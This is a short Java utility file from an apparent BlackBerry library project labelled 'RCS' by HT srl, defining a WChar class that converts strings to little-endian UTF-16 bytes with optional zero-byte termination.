/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : WChar.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.utils;

import java.io.UnsupportedEncodingException;

public class WChar {
    public static byte[] getBytes(String string) {
        return getBytes(string, false);
    }

    public static byte[] getBytes(String string, boolean endzero) {
        byte[] encoded = null;

        try {
            encoded = string.getBytes("UnicodeLittleUnmarked");
        } catch (UnsupportedEncodingException e) {
            // debug.Error("UnsupportedEncodingException");
            // e.printStackTrace();
        }

        if (endzero) {
            byte[] zeroencoded = new byte[encoded.length + 4];
            Utils.Copy(zeroencoded, encoded, encoded.length);
            encoded = zeroencoded;
        }

        return encoded;
    }
}
